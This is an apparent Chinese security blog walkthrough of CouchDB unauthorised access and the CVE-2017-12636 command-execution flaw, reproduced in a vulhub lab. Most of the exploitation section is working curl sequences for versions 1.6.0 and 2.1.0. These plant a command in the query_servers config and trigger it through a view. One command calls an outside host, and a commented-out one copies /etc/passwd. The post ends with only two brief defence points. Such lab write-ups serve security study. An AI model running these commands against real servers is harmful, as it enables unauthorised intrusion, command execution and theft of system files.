# CouchDB未授权访问&命令执行


#### 漏洞简介以及危害
Apache CouchDB是一个开源数据库,专注于易用性和成为"完全拥抱web的数据库"。它是一个使用JSON作为存储格式,JavaScript作为查询语言,MapReduce和HTTP作为API的NoSQL数据库。
应用广广泛,如BBC用在其动态内容展示平台,Credit Suisse用在其内部的商品部⻔的市场框架,Meebo,用在其社交平台(web和应用程序),默认会在`5984端口`开放Restful的API接口口,如果使用
SSL的话就会监听在`6984端口`,用于数据库的管理功能。其HTTP Server默认开启时没有进行行行验证,而且绑定在0.0.0.0,所有用户均可通过API访问导致未授权访问。
在官方方配置文文档中对HTTP Server的配置有WWW-Authenticate:Set this option to trigger
basic-auth popup on unauthorized requests,但是很多用户都没有这么配置,导致漏洞产生。

在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置`query_server`，这个配置项在设计、执行view的时候将被运行。

影响版本：小于 1.7.0 以及 小于 2.1.1


#### 漏洞环境
vulnhub

#### 漏洞利用
CVE-2017-12636是需要登录用户方可触发，如果不知道目标管理员密码，可以利CVE-2017-12635[CVE-017-12635](https://blog.csdn.net/JiangBuLiu/article/details/94027581)先【增加一个管理员用户】，如果无须帐号密码，就可通过未授权访问进行命令执行
同样，记得在Burp的拦截端口添加一个5984


进入环境，并启动
```bash
cd couchdb/CVE-2017-12636/
docker-compose up -d
```


###### 未授权访问测试
```bash
curl http://192.168.0.100:5984
curl http://192.168.0.100:5984/_config
```

<img src="http://image.geoer.cn/CouchDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE1.png"></img>

###### 任意命令执行漏洞

```bash
# 本机python运行http服务(可以不运行这个步骤，这里只是做curl测试用的)
python -m SimpleHTTPServer 8888
```

1.6.0 下

```bash
#依次执行如下命令
curl -X PUT 'http://192.168.0.100:5984/_config/query_servers/cmd' -d '"curl http://192.168.0.105:8888/test.php"' # 这里可以执行任意命令
#curl -X PUT 'http://192.168.0.100:5984/_config/query_servers/cmd' -d '" cat /etc/passwd >> tmp/ext_passwd"' 
curl -X PUT 'http://192.168.0.100:5984/vultest'    # 添加一个Database和Document
curl -X PUT 'http://192.168.0.100:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'
curl -X POST 'http://192.168.0.100:5984/vultest/_temp_view?limit=11' -d '{"language":"cmd","map":""}' -H 'Content-Type: application/json'      # 在这个Database里查询，将language设置为cmd，这里就会用到我第一步里添加的名为cmd的query_servers，最后触发命令执行
```

2.1.0 下
```bash
# 2.1.0中修改了1.6.0用到的两个API
# Couchdb 2.x 引入了集群，所以修改配置的API需要增加node name。我们带上账号密码访问/_membership即可
curl http://<your-ip>:5984/_membership

# 利用(跟1.6.0类似)
curl -X PUT http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d '"id >/tmp/CVE-2017-12636_is_success"'
curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest'    #先增加一个Database和一个Document
curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'
#Couchdb 2.x删除了_temp_view，所以我们为了触发query_servers中定义的命令，需要添加一个_view
curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d '{"_id":"_design/test","views":{"wooyun":{"map":""} },"language":"cmd"}' -H "Content-Type: application/json"
#增加_view的同时即触发了query_servers中的命令。
```

<img src="http://image.geoer.cn/CouchDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE2.png"></img>

exp地址

```
https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py
```

**nmap扫描**

```bash
nmap -p 5984 --script "couchdb-stats.nse" <target_ip>
```


#### 防御手段
- 绑定指定ip
- 设置访问密


---

> 作者: [剑胆琴心](http://shuai06.github.io)  
> URL: https://shuai06.github.io/couchdb%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/  

